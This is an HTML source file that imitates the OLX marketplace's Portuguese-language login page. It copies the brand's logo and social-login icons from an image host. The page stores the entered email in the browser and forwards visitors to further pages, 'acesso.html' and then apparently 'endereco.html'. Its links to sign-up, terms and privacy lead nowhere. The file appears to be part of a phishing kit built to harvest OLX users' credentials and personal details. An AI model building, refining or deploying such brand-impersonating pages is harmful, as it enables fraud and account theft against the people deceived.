<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Acesse sua conta - OLX</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fff;
      margin: 0;
      padding: 0;
    }

    .logo-container {
  padding: 24px 16px 0 16px;
  margin-bottom: 20px; /* adiciona espaço extra abaixo do logo */
}

    .logo img {
      height: 30px;
    }

    .linha {
      width: 100%;
      height: 1px;
      background-color: #e5e5e5;
      margin: 0;
    }

    .espaco-entre-linhas {
      height: 1cm;
    }

    .container {
      max-width: 400px;
      margin: 0 auto;
      padding: 24px 16px;
    }

    h2 {
  font-size: 20px;
  margin-bottom: 106px;  /* mais espaço abaixo do título */
  text-align: center;
  font-weight: 400;     /* peso da fonte mais fino */
}

    label {
      display: block;
      font-size: 14px;
      margin-bottom: 15px;
    }

    input[type="email"] {
      width: 92%;
      padding: 18px;
      font-size: 14px;
      border: 1px solid #ccc;
      border-radius: 8px;
      margin-bottom: 35px;
    }

    .btn-continuar {
      width: 100%;
      background-color: #ff7a26;
      color: white;
      padding: 10px;
      font-size: 16px;
      border: none;
      border-radius: 50px;
      cursor: pointer;
      margin-bottom: 60px;
    }

    .divider {
      text-align: center;
      color: #999;
      font-size: 14px;
      margin: 20px 0;
      position: relative;
    }

    .divider::before,
    .divider::after {
      content: "";
      position: absolute;
      top: 50%;
      width: 35%;
      height: 1px;
      background-color: #ccc;
    }

    .divider::before {
      left: 0;
    }

    .divider::after {
      right: 0;
    }

    .social-buttons {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-bottom: 24px;
    }

    .social-buttons img {
      width: 60px;
      height: 60px;
      cursor: pointer;
    }

    .ajuda {
      text-align: center;
      font-size: 14px;
      color: #666;
      margin-top: 20px;
    }

    .footer {
      text-align: center;
      font-size: 12px;
      color: #999;
      margin-top: 40px;
      padding: 20px;
    }

    .footer a {
      color: #8000ff;
      text-decoration: none;
    }
    
    .cadastro {
  text-align: center;
  font-size: 14px;
  color: #666;
  margin-top: 20px;
  margin-bottom: 32px;
}

.link-cadastro {
  color: #8000ff;
  text-decoration: none; /* remove o sublinhado */
  font-weight: bold;
}

.ajuda-container {
  text-align: center;
  font-family: Arial, sans-serif;
  margin-top: 40px;
  padding: 0;
}

.precisa-ajuda {
  background-color: #f2f2f2;
  padding: 9px 0;
  font-size: 14px;
  font-weight: 400;
  color: #333;
  width: 100%;
  display: block;
  border-radius: 0;
  border-top: 1px solid #e0e0e0;
  border-bottom: 2px solid #e0e0e0;
}

.seta {
  font-weight: bold;
}

.termos-texto {
  font-size: 13px;
  color: #666;
  line-height: 1.5;
  padding: 12px 20px;
  margin: 0 auto;
  max-width: 400px;
}

.link-roxo {
  color: #7300e6;
  text-decoration: none;
  font-weight: 500;
}
  </style>
</head>
<body>
  <script>
  const emailSalvo = localStorage.getItem('emailDigitado');
  if (emailSalvo) {
    window.location.href = 'endereco.html';
  }
</script>

  <!-- Logo OLX -->
  <div class="logo-container">
    <div class="logo">
      <img src="https://i.postimg.cc/SswyzD2J/Background-Eraser-20250731-130123999.png" alt="Logo OLX">
    </div>
  </div>

  <!-- Linhas horizontais -->
  <div class="linha"></div>
  <div class="espaco-entre-linhas"></div>
  <div class="linha"></div>

  <!-- Formulário -->
  <div class="container">
    <h2>Acesse a sua conta</h2>

    <!-- Campo de E-mail -->
<div style="text-align: center; margin-top: 20px;">
  <input type="email" id="email" placeholder="E-mail" style="padding: 12px; width: 80%; border-radius: 8px; border: 1px solid #ccc; font-size: 16px;" />
  
  <!-- Mensagem de erro (escondida por padrão) -->
  <div id="erro-email" style="color: red; font-size: 14px; margin-top: 8px; display: none;">
    Digite seu e-mail para continuar
  </div>
</div>
    

<!-- Botão Continuar -->
<div style="text-align: center; margin-top: 20px;">
  <button id="botaoContinuar" style="padding: 12px 154px; background-color: #f68b1f; color: white; border: none; border-radius: 25px; font-size: 16px; cursor: pointer;">
    Continuar
  </button>
</div>

    <div class="divider">Ou conecte com</div>

    <div class="social-buttons">
      <img src="https://i.postimg.cc/L414MKwf/Background-Eraser-20250731-130323564.png" alt="Google">
      <img src="https://i.postimg.cc/VLXNXQF1/Background-Eraser-20250731-130503699.png" alt="Facebook">
    </div>
    
    <div class="cadastro">
  Não tem uma conta? <a href="#" class="link-cadastro">Cadastre-se</a>
</div>

    <div class="ajuda-container">
  <div class="precisa-ajuda">Preciso de ajuda <span class="seta">&gt;</span></div>

</div>

  <!-- Rodapé -->
  <div class="footer">
    Ao continuar, você concorda com os <a href="#">Termos de Uso</a> e a <a href="#">Política de Privacidade</a> da OLX e seus parceiros.
  </div>

  <script>
    function irParaProximaPagina() {
      window.location.href = "acesso.html";
    }
  </script>
<!-- Validação do E-mail -->
<script>
  document.getElementById('botaoContinuar').addEventListener('click', function () {
    var email = document.getElementById('email').value.trim();
    var erro = document.getElementById('erro-email');

    if (email === '') {
      erro.style.display = 'block'; // mostra a mensagem
    } else {
      erro.style.display = 'none'; // esconde a mensagem
      localStorage.setItem('emailDigitado', email);
window.location.href = 'acesso.html'; // redireciona se estiver preenchido
    }
  });
</script>
</body>
</html>
